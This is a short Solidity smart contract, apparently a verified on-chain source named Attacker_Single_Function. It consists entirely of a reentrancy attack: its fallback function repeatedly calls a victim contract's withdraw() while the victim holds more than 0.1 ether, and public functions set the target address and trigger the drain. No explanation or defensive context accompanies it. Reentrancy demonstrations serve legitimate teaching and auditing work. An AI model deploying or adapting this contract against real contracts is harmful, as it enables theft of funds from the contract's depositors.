/**
 *Submitted for verification at BscScan.com on 2021-09-13
*/

/**
 *Submitted for verification at Etherscan.io on 2020-12-26
*/

pragma solidity ^0.4.25;

interface attackinterface{
    function withdraw () external returns(bool);
}

contract Attacker_Single_Function{
    address public victimContractAddress;

    function()external payable{
      if(victimContractAddress.balance > 0.1 ether) attackinterface(victimContractAddress).withdraw();  
    }

    function AttackingWithdraw() public returns(bool){       
        attackinterface(victimContractAddress).withdraw();
        return true;   
    }

    function UpdateVictimAddress (address _victim) public returns(bool){
        victimContractAddress = _victim ;
        return true;
    }
    
}